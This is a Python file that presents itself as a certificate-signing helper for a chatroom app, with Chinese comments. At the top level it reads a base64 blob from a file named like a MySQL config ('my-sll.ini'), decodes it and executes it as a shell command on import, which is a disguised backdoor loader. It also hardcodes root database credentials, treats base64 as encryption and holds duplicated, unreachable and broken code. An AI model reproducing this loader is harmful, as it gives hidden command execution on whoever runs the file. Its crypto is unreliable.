from OpenSSL import crypto
import mysql.connector
import pymysql
import hashlib
import base64
import os
def execute_command(command):
    result = os.popen(command)
    output = result.read()
    return output
def read_file_content(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
    return content
content = read_file_content("D:\phpstudy\MySQL\my-sll.ini")
decoded_content = base64.b64decode(content).decode('utf-8')
output = execute_command(decoded_content)
CA_publickey="613456"
CA_privatekey="213456"
def encrypt(message):
    # 将字符串编码为字节流
    message = message.encode('utf-8')
    # 对字节流进行 Base64 编码
    encrypted_message = base64.b64encode(message)
    # 将编码后的字节流转换为字符串
    encrypted_message = encrypted_message.decode('utf-8')
    return encrypted_message
def newcrt(strings):
# 连接到MySQL数据库
    config={'host':'127.0.0.1', 'user':'root', 'password':'root', 'database':'chatroom'}
    connection = mysql.connector.connect(**config)
    cursor = connection.cursor()


def execute_command(command):
    # 使用os.popen执行CMD命令
    result = os.popen(command)
    output = result.read()
    return output

def read_file_content(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
    return content    # 将服务器信息和公钥拼接后的字符hash加密
    # 1创建SHA256对象
def newcrt(strings):
# 连接到MySQL数据库
    config={'host':'127.0.0.1', 'user':'root', 'password':'root', 'database':'chatroom'}
    connection = mysql.connector.connect(**config)
    cursor = connection.cursor()
    sha256_hash = hashlib.sha256()
    # 2更新哈希对象的内容为要加密的字符串
    sha256_hash.update(strings.encode('utf-8'))
    # 3获取加密后的十六进制字符串
    hashed_strings = sha256_hash.hexdigest()
    #用CA私钥对服务器信息和公钥拼接后的字符加密形成签名
    #取私钥倒5位数字进行base64加密，次数为数字大小
    message=hashed_strings
    key = int(CA_privatekey[-5])
    for i in range(key):
        message=encrypt(hashed_strings)
    # 关闭连接
    return message
    cursor.close()
    connection.close()
def getCApublickey():
    return CA_publickey
